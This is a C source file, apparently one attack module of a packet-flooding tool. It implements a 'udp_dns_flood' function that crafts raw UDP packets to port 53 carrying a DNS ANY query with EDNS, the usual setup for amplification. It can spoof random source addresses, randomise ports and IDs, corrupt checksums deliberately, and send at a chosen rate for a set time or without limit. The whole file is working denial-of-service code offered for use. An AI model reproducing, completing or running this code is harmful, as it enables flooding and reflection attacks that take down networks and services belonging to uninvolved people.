#include "../../include/methods.h"

static struct udphdr		*udp;
static struct iphdr		*ip;
static u_char			frame[65535];

static u_char PAYLOAD[]="\xf1\xe8\x01\x20\x00"
	"\x01\x00\x00\x00\x00\x00\x01\x02\x73\x6c"
	"\x00\x00\xff\x00\x01\x00\x00\x29\x10\x00"
	"\x00\x00\x80\x00\x00\x0c\x00\x0a\x00\x08"
	"\xc0\x4e\xd3\x88\xf7\x91\x6b\xb6";

static void inline for_iteration(method_args_t *a)
{
	if (a->o->OPT_SOURCE[0]=='\a')
		ip->saddr=random_ipv4();

	/* dport not */
	ip->id=htons(random_u16());
	udp->uh_sport=(a->o->OPT_SRCPORT==ARANDVAL)?
		htons(random_u16()):htons(a->o->OPT_SRCPORT);

	ip->check=0;
	ip->check=in_check((u_short*)ip,sizeof(*ip));
	udp->uh_sum=0;
	udp->uh_sum=ip4_pseudocheck(ip->saddr, ip->daddr,
		IPPROTO_UDP, ((ntohs(udp->uh_ulen))), udp);

	if (a->o->OPT_BADSUM==ARANDVAL) {
		if (randnum(0,1)==0)
			--udp->uh_sum;
	}
	else if (a->o->OPT_BADSUM==1)
		--udp->uh_sum;
}

void udp_dns_flood(method_args_t *a)
{
	memset(frame,0,sizeof(frame));
	memcpy(frame,a->machdr,14);
	ip=(struct iphdr*)(frame+14);
	udp=(struct udphdr*)(frame+14+(sizeof(struct iphdr)));

	ip->ihl=5;
	ip->version=4;
	ip->tos=0;
	ip->ttl=100;
	ip->frag_off=0;
	ip->protocol=IPPROTO_UDP;
	ip->saddr=a->source;
	ip->daddr=a->target;
	ip->tot_len=htons((sizeof(struct iphdr)+
		sizeof(struct udphdr)+(sizeof(PAYLOAD)-1)));

	memcpy((frame+14+sizeof(struct udphdr)+(sizeof(struct iphdr))),
		PAYLOAD,(sizeof(PAYLOAD)-1));

	udp->uh_ulen=htons(sizeof(struct udphdr)+(sizeof(PAYLOAD)-1));
	udp->uh_dport=htons(53);

	FLOODRUN(a,for_iteration(a),ethsend(a->fd,frame,ntohs(ip->tot_len)+14),
		a->o->OPT_PPS,a->o->OPT_TIME,a->o->OPT_UNLIMIT);
}
